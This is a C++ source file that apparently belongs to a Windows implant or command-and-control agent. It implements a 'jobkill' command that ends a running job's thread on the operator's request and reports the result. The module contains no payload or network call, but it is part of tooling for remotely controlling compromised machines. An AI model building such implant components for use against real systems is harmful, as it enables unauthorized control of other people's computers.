#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JOBKILL

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_jobkill(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t target_len = 0;
    auto target_uuid = parser_string( params, &target_len );

    if ( !target_uuid || target_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing task id" ) ) );
        return;
    }

    for ( uint32_t i = 0; i < inst.jobs.count; i++ ) {
        auto& job = inst.jobs.entries[i];
        if ( !job.active ) continue;

        if ( str_ncmp( job.task_uuid, target_uuid, target_len ) == 0 ) {
            if ( job.h_thread ) {
                inst.kernel32.TerminateThread( job.h_thread, 0 );
                inst.kernel32.CloseHandle( job.h_thread );
            }
            job.active = false;
            job.h_thread = nullptr;

            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "job killed" ) ) );

            queue_response( inst, job.task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "task killed by operator" ) ) );
            return;
        }
    }

    queue_response( inst, task_uuid, RESPONSE_ERROR,
        symbol<char*>( const_cast<char*>( "job not found" ) ) );
}

#endif
